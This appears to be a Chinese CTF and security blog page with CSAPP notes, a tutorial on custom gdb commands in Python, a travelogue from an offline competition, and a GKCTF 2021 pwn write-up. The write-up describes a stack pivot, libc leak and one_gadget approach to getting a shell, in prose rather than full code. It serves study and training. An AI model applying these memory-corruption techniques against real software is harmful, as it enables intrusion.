p.close()</span><br></pre></td></tr></table></figure>



<p><img src="/../img/2706180-20220324174853430-1511606619.png"><br>PS：这道题如果打远程的话，是需要用题目中给出的动态库，如果本地的话，用自己本地的动态库就行</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/6a3eb07a.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/6a3eb07a.html" class="post-title-link" itemprop="url">CSAPP-第二章 信息的表示和处理（笔记）</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-02-16 19:11:13" itemprop="dateModified" datetime="2023-02-16T19:11:13+08:00">2023-02-16</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">读书笔记</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><p>如果描述一个房子的面积，我们可以用平方米这个单位，描述一棵树的高度可以用米为单位，又或者描述一个沙袋的重量可以用千克为单位，同样计算机中的内存大小也有单位来描述。</p>
<p>在第一章的笔记中提到了 <code>bit</code> 的概念，一个二进制中的 <code>0</code> 或 <code>1</code> 就是一个 <code>bit</code>，而 <code>8</code> 个 <code>bit</code> 就是一个字节（ <code>byte</code> ）。我们如果说一个电脑的运行内存为 <code>4GB</code> ，那么这个 <code>1GB</code> 就是 <code>1024MB</code> ，而 <code>1MB</code> 就是 <code>1024KB</code> ，<code>1KB</code> 是 <code>1024B</code> 此时的 <code>B</code> 也就是 <code>byte</code> ，所以现在我说 <code>4GB</code> ，你可能大概就知道这有多少个 <code>0</code> 或 <code>1</code> 了（至少这多到你无法想象）</p>
<p>现在大多数计算机（也就是 <code>64</code> 位机器）都使用 <code>8</code> 字节作为最小的可寻址的内存单位，而不是使用内存中单独的位（也就是 <code>bit</code>）。机器级程序将内存视为一个非常大的字节数组，称为虚拟内存（之后提到的内存，通常默认指虚拟内存，这个虚拟地址是展示给程序的概念性映像，虚拟也为假象，这个手段是由硬件和操作系统来实现的）。内存中的<strong>每个字节都有自己的地址也就是唯一数字标识</strong>，</p>
<h3 id="十六进制表示法"><a href="#十六进制表示法" class="headerlink" title="十六进制表示法"></a>十六进制表示法</h3><p>如果人直接去对着二进制数据进行分析，会感到阅读困难且冗长，如果使用十进制的话虽然方便了人类阅读但是与位模式的互相转换又会很麻烦，因此就诞生了十六进制表示法。<code>0 ~ 9</code> 和 <code>A ~ F</code> 表示了 <code>16</code> 个可能的值。一个字节的值域为 <code>0 ~ 255</code> ，用十六进制则表示为 <code>0x00 ~ 0xFF</code> ，以 <code>0x</code> 或 <code>0X</code> 开头的数字被认为是十六进制。字符 <code>A ~ F</code> 的大小写无所谓，即便是 <code>0xfA1Bd</code> 这样的大小写混合。</p>
<p>十六进制和二进制直接可以很快的进行转换，比如 <code>0x173A4C</code></p>
<table>
<thead>
<tr>
<th>十六进制</th>
<th>1</th>
<th>7</th>
<th>3</th>
<th>A</th>
<th>4</th>
<th>C</th>
</tr>
</thead>
<tbody><tr>
<td>二进制</td>
<td>0001</td>
<td>0111</td>
<td>0011</td>
<td>1010</td>
<td>0100</td>
<td>1100</td>
</tr>
</tbody></table>
<p>你可以发现十六进制转为二进制，你只需要看每一个数字将其转换为对应二进制，最后拼凑起来即可，所以它的二进制表示为 <code>000101110011101001001100</code></p>
<p>二进制转换十六进制也是这个方法，不过当位<strong>总数不是 <code>4</code> 的倍数时，需要在最左侧补 <code>0</code></strong> ，最后将每个 <code>4</code> 位组转换为对应的十六进制数字</p>
<p>逻辑运算</p>
<p>位级运算</p>
<p>移位运算</p>
<p>字节顺序</p>
<p>大端序，小端序</p>
<h3 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h3><p>存储 运算与访问</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/26ba4673.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/26ba4673.html" class="post-title-link" itemprop="url">用python来自定义gdb命令</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-02-08 15:34:08" itemprop="dateModified" datetime="2023-02-08T15:34:08+08:00">2023-02-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%B0%9D%E8%AF%95%E5%BC%80%E5%8F%91%E5%B0%8F%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">尝试开发小工具</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><code>gdb</code> 是一款 <code>linux</code> 下常用的程序调试器，有时可能我们会根据自己的需求来尝试写一些自定义的 <code>gdb</code> 命令，而通过 <code>python</code> 语言来编写的话，是再好不过了，下面记录一下如何用 <code>python</code> 语言编写自己的 <code>gdb</code> 命令</p>
<p>有两种方法，第一种是直接在 <code>.gdbinit</code> 文件中来编写，如果只是自定义一个或很少的命令采用这种方法是可以的。（ <code>gdb</code> 启动时，会在当前用户的主目录寻找一个 <code>.gdbinit</code> 的文件，如果该文件存在的话将执行该文件的所有命令）</p>
<p>假设现在编写一个获取 <code>libc</code> 基地址的命令,代码如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libc_cmd</span>():</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    line = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> line:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;libc&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">            <span class="built_in">list</span>=i.split(<span class="string">&quot;    &quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mlibc base\033[0m    &quot;</span>,<span class="built_in">list</span>[<span class="number">1</span>])</span><br><span class="line">end </span><br><span class="line"></span><br><span class="line">define libc</span><br><span class="line">    python libc_cmd()</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>这个格式是先在一行写下 <code>python</code> ，接下来正常编写函数即可（ <code>gdb.execute</code> 函数可以在 <code>gdb</code> 内部执行命令，并且将命令的执行结果返回给调用者 ），最后以 <code>end</code> 结尾。然后再用 <code>define</code> 来定义这个命令的名称，然后下一行用 <code>python</code> 调用上面的函数，最后以 <code>end</code> 结尾即可。</p>
<p>把上面的代码复制到 <code>.gdbinit</code> 文件中，启动 <code>gdb</code> 即可正常使用 <code>libc</code> 命令</p>
<p>但如果想自定义的命令很多的话，全部把命令都写到 <code>.gdbinit</code> 会显得很臃肿，所以可以把自定义的命令单独都存放到一个 <code>py</code> 文件中。比如创建一个叫做 <code>command.py</code> 的文件，然后在 <code>.gdbinit</code> 的开始写入 <code>source /home/zikh/Desktop/command.py</code> 即可，然后开始在 <code>command.py</code> 文件中编写命令。</p>
<p>比如我这里编写一个获取 <code>libc</code> 基地址、堆地址和程序基地址的命令,代码如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">base_cmd</span>():</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    lines = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    flag1=<span class="number">0</span></span><br><span class="line">    flag2=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">match</span>=[]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;home&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> flag1==<span class="number">0</span>:</span><br><span class="line">            flag1=<span class="number">1</span></span><br><span class="line">            line=line.split()</span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">match</span>=re.findall(<span class="string">&quot;(0x\w+)&quot;</span>,element)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    base_addr=<span class="keyword">match</span>[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;heap&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> flag==<span class="number">0</span>:</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            line=line.split()</span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">match</span>=re.findall(<span class="string">&quot;(0x\w+)&quot;</span>,element)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    heap_addr=<span class="keyword">match</span>[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;libc&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> flag2==<span class="number">0</span>:</span><br><span class="line">            flag2=<span class="number">1</span></span><br><span class="line">            line=line.split()     </span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">match</span>=re.findall(<span class="string">&quot;(0x\w+)&quot;</span>,element)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    libc_addr=<span class="keyword">match</span>[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mbase address\033[0m\t\t\t&quot;</span>,base_addr)</span><br><span class="line">    <span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;\033[0;32;47mno heap\033[0m&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mheap base\033[0m\t\t\t&quot;</span>,heap_addr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mlibc base\033[0m\t\t\t&quot;</span>,libc_addr)</span><br></pre></td></tr></table></figure>

<p>这个格式比较简单，首先在 <code>py</code> 文件的开头导入 <code>gdb</code> 模块，然后正常定义函数即可，最后写上 <code>gdb.execute(&quot;define base\n\tpython base_cmd()\nend&quot;)</code> ，这句一定要有，这个可以理解为你输入一个命令，然后 <code>gdb</code> 要查找是否存在这个命令的定义，只有加上最后一句，才能够识别出来这个命令。（每写一个命令，都需要加上 <code>gdb.execute</code> 的命令声明）</p>
<p>实际运行情况如下：</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041312961.png" alt="image-20230204131253466" style="zoom:50%;" />



<p>如果要写带参数命令的话，可以参考以下格式</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_cmd</span>(<span class="params">arg0</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;decimal :\t&quot;</span>,arg0)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hexadecimal\t&quot;</span>,<span class="built_in">hex</span>(arg0))</span><br><span class="line">gdb.execute(<span class="string">&quot;define hex\n\tpython hex_cmd(int($arg0))\nend&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041315210.png" alt="image-20230204131502126"></p>
<p>本文只是简单记录一下如何用 <code>python</code> 来编写 <code>gdb</code> 命令，至于编写什么命令，还是要根据自己的实际需求来考虑。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/b0250b87.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/b0250b87.html" class="post-title-link" itemprop="url">强网拟态线下游记</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-12-23 10:38:37" itemprop="dateModified" datetime="2022-12-23T10:38:37+08:00">2022-12-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="启程："><a href="#启程：" class="headerlink" title="启程："></a>启程：</h3><p>在强网拟态线上赛拿到了进入决赛的资格，因为疫情原因大家都以为决赛会在线上，而起初也确实如此，赛方说是决赛也进行线上赛，不过随着国家对于防疫政策的放开，在临近决赛的时候赛方最终决定可以出十支队伍来南京参加线下赛，而其他五十支队伍在线上进行。</p>
<p>菜鸡的我自然是渴望线下赛的，并且在家里也没有什么事情(除了学车和考试…),最终决定前往南京参加线下赛并且与平常交流甚多的师傅们见面。于是买票，出发，前往南京！</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212191125243.png" alt="image-20221219112522111"></p>
<p>该说不说，因为路费报销限额是1500，坐高铁一等座是真的香，然后外出也不用考虑是地铁倒公交啥的，直接出租车就是冲。</p>
<h3 id="见面："><a href="#见面：" class="headerlink" title="见面："></a>见面：</h3><p>去到酒店见到了平常线上经常交流的师傅们(h1J4cker师傅 winmt师傅还有三哈师傅等等)。winmt师傅实在是太高辣，一米九多~   </p>
<p>酒店确实大，头两次只能靠着箭头标志找到房间，酒店房间也挺不错的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221116485.jpg" alt="img"></p>
<p>陆陆续续人齐了之后先去医院排了一个半小时的队伍做了核酸，完事之后去聚餐吃了火锅</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221112652.jpg" alt="img"></p>
<h3 id="比赛："><a href="#比赛：" class="headerlink" title="比赛："></a>比赛：</h3><p>第二天起来先去干了早饭，说实话这个自助的早餐确实牛皮，吃了五天不重样的早餐(馄饨，汤面，灌汤包，蔬菜沙拉，小笼包，干煸豆角等等太多了记不清)</p>
<p>接着做了第二班车去了比赛会场</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221121829.jpg" alt="img" style="zoom:50%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221122695.jpg" alt="img" style="zoom:50%;" />

<p>上午准备了下环境，然后是开幕式好多领导上去讲话 比赛是十二点开始，为了尽量不影响比赛肯定是午餐在十二点前提供，又是干饭…</p>
<p>比赛正式开始之后，我记得是有三个赛道，一个赛道放的是CTF题目，PWN有四道题，我和h1师傅一人做了一道，我打的是一个猜测随机数+SSP Leak，h1师傅做的那个是堆题，整体不算难，但是用ida打开之后的数据是混乱的(这里不知道是怎么实现的)，反正主要是靠交互来完成的大体脚本，最后的一些细节是读了下汇编调了一下搞定的。另外两道pwn，一个是格式化字符串加栈溢出，正常来说这个题肯定是要被打烂的，但是这个题上了拟态防御，就是我的一个payload打过去，服务端那里挂起的好几个程序的回显一样才可以正常运行，因此格式化字符串和栈溢出其实全都用不了，一道真正意义上的无解PWN(没错，这题放出来就不是让得分的，而是为了证实这个拟态防御的强大…)，另外一道在得知了也是无解之后就没再看了。</p>
<p>然后pwn做完之后，就没事干了。因为这个比赛考的主要是对设备的真实攻击和拟态防御而并非是CTF，所以CTF题目只是为了解出来得分，然后去做其他赛道的题目，攻击真实设备。</p>
<p>后面的几天PWN手就做大牢了，除了一个ADAS和T-BOX4这俩拿到了二进制文件，剩下的题目基本都没有PWN手的事情了，那两个二进制文件都是跟着winmt师傅分析学习了一下，都是aarch64的程序我记得。目的是找漏洞写报告，并不是拿shell(因为给的二进制文件也不完整)</p>
<p>winmt师傅给我说的思路是可以从危险函数下手，看交叉引用然后如果危险函数的参数可控，那就属于一些漏洞，比如exec的参数可控就是任意命令执行，或者fopen函数的参数可控就是任意文件读取等等(当然实际要比这复杂，主要是需要逆向和仔细分析)，当时我们找到了一个栈上的off by null漏洞，以及一个堆溢出的漏洞和格式化字符串漏洞，剩下基本上都是web大哥们在疯狂上分。</p>
<p>除去比赛之外，让我印象比较深的就是吃的非常nice，这些天吃了火锅 烤肉 披萨 烤鸭 鲍鱼 金汤肥牛 煲仔饭等等，他们熬夜干到很晚的师傅还吃了KFC(好像当时就我睡了 0.0)，然后晚上还和h1师傅看了两场世界杯(虽然在看决赛的时候他几乎一直在睡觉QAQ)</p>
<h3 id="尾声："><a href="#尾声：" class="headerlink" title="尾声："></a>尾声：</h3><p>最后比赛的成绩还可以吧，主要是第一次打这个没经验，其实应该先去打那些设备交实验报告得分，而不是先逮着CTF的题目日，这就导致了一些队伍把很简单的漏洞找到并且提交报告后，那些设备就下线了，错失了最开始的得分机会。</p>
<p>不过这次比赛收获还是蛮大的(虽然很多时候在摸鱼)，但是能和师傅们一起线下交流其实还挺不错的，尤其是winmt师傅的现场教学QAQ。</p>
<p>最后来了一张三个PWN手的合影 -&gt;_-&gt;</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221300998.jpg" alt="img" style="zoom:50%;" />

<p>以及所有人的合照</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221300400.jpg" alt="img" style="zoom:50%;" />

<p>当然了  最牛皮的居然是发现自己上电视了</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221301622.jpg" alt="img" style="zoom:50%;" />



<p>坏消息是我们全军覆没，直接都成小阳人…   </p>
<p>之后还得再提升自己的技术，希望有更多机会和师傅们一起参加线下赛</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/a81fb7da.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/a81fb7da.html" class="post-title-link" itemprop="url">GKCTF 2021_checkin</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-10-08 10:24:48" itemprop="dateModified" datetime="2022-10-08T10:24:48+08:00">2022-10-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/buu%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">buu刷题</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>1、这道题md5加密这个点，其实蛮重要的，个人感觉想判断出来的话，只能是靠经验的积累。下回只要遇见了这种奇奇怪怪的函数，还给了类似于密文这种东西，就去考虑加密。</p>
<p>2、能够输入的字节很少的时候，执行某个函数，可以尝试写call的这个地址，这样即可以执行函数，又可以控制执行流（只要我们可以把控好选取的call地址即可）</p>
<p>3、后期调试的话，多按自己的思路思考（不要被网上其他师傅写的wp所局限了）。</p>
<h1 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h1><p><img src="/../img/2706180-20220331215203116-666268230.png"></p>
<h1 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h1><p><img src="/../img/2706180-20220331215212743-248424037.png"></p>
<p>输入点有两处，第一次输入是输入到bss段，第二次输入是给到buf,存在八字节的溢出。一看这种存在八字节的溢出基本就可以确定是栈迁移没跑了。</p>
<p>然后第一次输入的数据，前五个字节必须是admin，否则的话就会触发exit。同时sub_401974函数的返回值也必须是0，否则就会触发exit。我们肯定是不能去触发这个exit的，不然程序直接就结束了。</p>
<p><img src="/../img/2706180-20220331215224208-1732771002.png"></p>
<p>观察sub_401974函数，发现这个函数很奇怪，首先是给了个数组v4，然后赋了两个莫名其妙的值，然后发现返回值的地方有一个判断，只要v5有一个字节和v4的不同，就返回1（这并不是我们想要的），如果能成功的跑16次循环，也就是说v5与v4的十六个字节全部相同，才会返回我们想要的0。</p>
<p>看看v5是什么？点进sub_400990函数看一下</p>
<p><img src="/../img/2706180-20220331215234682-403874894.png"></p>
<p>发现很奇怪，然后把每个函数都点一下，发现就更奇怪了….</p>
<p>想遇见这种奇奇怪怪的情况，就考虑加密的形式。而最开始给的v4的值，就是密文。</p>
<p>然后就转一下看看（淦，其实我也是看师傅的wp才知道这是md5加密的，这只能靠经验和积累来判断吧？），发现是md5加密。</p>
<p><img src="/../img/2706180-20220331215251779-22545722.png"></p>
<p>由于这个是小端序存放的v4，转换过来的话，应该是从右往左看。</p>
<p>取出来是个这玩意 21232f297a57a5a743894a0e4a801fc3</p>
<p>找个在线网站转一下</p>
<p><img src="/../img/2706180-20220331215302448-1617321460.png"></p>
<p>如此思路就出来了，第一次要输入admin，去通过strncmp函数的检查，第二次还要输入admin，去通过与md5匹配的检查。那两次输入都是admin，我们怎么去劫持程序的执行流？  这里我们是可以采用00截断的，意思就是说用00来声明md5加密的内容结束，而00后面的就不会被加密了，但00后面的内容已经是存在的。</p>
<h1 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h1><p>这道题必然是考察栈迁移的，我们虽然只能控制rbp，但是由于这个函数结束的时候会执行一个leave;ret，而到main函数结束的时候又会执行一个leave;ret，因此我们只需要控制rbp，依然是可以完成栈迁移的。</p>
<p>这道题由于没办法泄露栈地址，因此迁移的话，肯定就是bss段。第一次在bss段输入内容的话，一共只能输入32字节，除去8字节的admin（admin后面还需要再填充3个00，用于补齐这一个内存单元），只剩下了24字节，我们肯定是考虑ret2libc的，那现在要做的就是泄露出来一个函数的真实地址。</p>
<p>问题是pop rdi占八字节，参数占八字节，执行puts又占八字节，这样看来，我们似乎是没办法控制返回地址了。</p>
<p>那这件事先缓一缓，我们再想一下，泄露出来了真实地址之后，肯定是要再来一次输入，将one_gadget的地址写入内存。同时还需要控制程序执行流，去执行这个one_gadget。综上所述，想完成这件事情，似乎我们只能是再跑一次程序，同时在跑之前还需要执行个puts函数。</p>
<p><img src="/../img/2706180-20220331215315108-697859807.png"></p>
<p>那我们把执行puts的地址写成0x4018B5,这样它不但执行了puts函数，同时让程序的执行流又从sub_4018c7函数（这个函数就是程序的主要部分）开始跑了。</p>
<h2 id="通过调试来进一步分析"><a href="#通过调试来进一步分析" class="headerlink" title="通过调试来进一步分析"></a>通过调试来进一步分析</h2><p>然后此时应该调试一下，看看程序的情况。再做进一步完善exp。</p>
<p><img src="/../img/2706180-20220331215325473-1898764410.png"></p>
<p>此时是在第二次执行往bss段输入的那个read函数，可以看出来现在还一切正常。似乎只要布置一个admin和one_gadget地址，然后第二次利用那个read完成一次迁移就行了，但是事实真的这么简单么？</p>
<p><img src="/../img/2706180-20220331215334034-1303724362.png"></p>
<p>现在来到了第二次往栈里输入的read，可以发现它输入的内容是往0x6023f0输入的，这意味着我们刚刚输入的admin和one_gadget会被这次输入的内容所覆盖（因为我们现在的栈就已经在bss段了，因此这次输入会干扰第一次输入）。先注意一下rbp的值，我们第二次输入的目的就是在不破坏one_gadget的情况下，覆盖rbp迁移到one_gadget这里。现在这里的输入距离rbp还有32个字节。这就意味着我们要是想控制这个rbp就必须覆盖之前写的one_gadget了。</p>
<p>不过最关键的一点是不是被忽略了，往bss段输入的那个read函数，可以输入32字节，如果我们把one_gadget给抬高呢？抬高到第24字节再布置（相当于0x602400地址来说，也就是此时的one_gadget应该是在0x602418的位置），而我们再输入32字节的话再写rbp的话，这个rbp也才是在0x602410这个位置（第二次输入是相当于0x6023f0来说），这样rbp就没有干扰到one_gadget</p>
<p>或者用另一种方法，我们第一次就输入一个admin，第二次输入的时候，我们同时布置one_gadget和覆盖rbp。控制rbp去迁移到one_gadget上面，二者的核心思路都是一样的。</p>
<p>然后就exp基本就出来了，需要注意的是，如果打远程，one_gadget搜索的是用题目给的libc，如果的打本地，one_gadget搜自己本地的libc。（另外就是，这道题用不了system加参数&#x2F;bin&#x2F;sh获取shell，不信的话，试一下就知道了）</p>
